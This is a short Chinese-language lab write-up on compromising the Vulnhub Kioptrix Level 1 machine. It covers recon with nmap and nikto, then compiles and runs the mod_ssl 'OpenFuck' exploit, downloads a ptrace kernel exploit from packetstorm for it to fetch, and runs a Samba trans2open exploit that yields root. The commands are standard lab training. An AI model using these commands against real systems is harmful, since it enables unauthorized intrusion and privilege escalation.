# Vulnhub Kioptix Level 1


# Vulnhub-kioptix-Level-1

### 基本信息

kali:192.168.110.10

靶机:192.168.110.12

### 一、信息收集

```
arp-scan -l
```

![](/vulnhub-kioptix-Level-1/01.JPG)

```
nmap -sV 192.168.110.12
```

`Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b`

![](/vulnhub-kioptix-Level-1/02.JPG)

```
nikto -host http://192.168.110.12/
```

![](/vulnhub-kioptix-Level-1/03.JPG)

扫到有CVE-2002-0082

443端口使用了mod_ssl服务为2.8.4

### 二、漏洞利用

### 漏洞利用1

![](/vulnhub-kioptix-Level-1/04.JPG)

查询到有exp

![](/vulnhub-kioptix-Level-1/05.JPG)

编译下

```
gcc -o exp 47080.c -lcrypto
```

![](/vulnhub-kioptix-Level-1/06.JPG)

![](/vulnhub-kioptix-Level-1/07.JPG)

```
./exp 0x6b 192.168.110.12 443
```

![](/vulnhub-kioptix-Level-1/08.JPG)

这边是后续的exploit没有下载成功，直接在shell里面尝试从链接里面下载试下

```
curl -O https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python3 -m http.server 8080
```

```
nano 47080.c
#修改http  改成本地地址
```

![](/vulnhub-kioptix-Level-1/09.JPG)

保存后重新编译运行

![](/vulnhub-kioptix-Level-1/10.JPG)

### 漏洞利用2

前面发现了139端口

用msf扫描一下

![](/vulnhub-kioptix-Level-1/11.JPG)

![](/vulnhub-kioptix-Level-1/12.JPG)

版本是2.2.1a

`searchsploit samba 2.2`找下有无可以利用的漏洞

![](/vulnhub-kioptix-Level-1/13.JPG)

`searchsploit -p 10.c` 寻找路径

![](/vulnhub-kioptix-Level-1/14.JPG)

`cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./`

![](/vulnhub-kioptix-Level-1/15.JPG)

编译一下

![](/vulnhub-kioptix-Level-1/16.JPG)

`./samba -b 0 192.168.110.12`

![](/vulnhub-kioptix-Level-1/17.JPG)

已拿到root权限
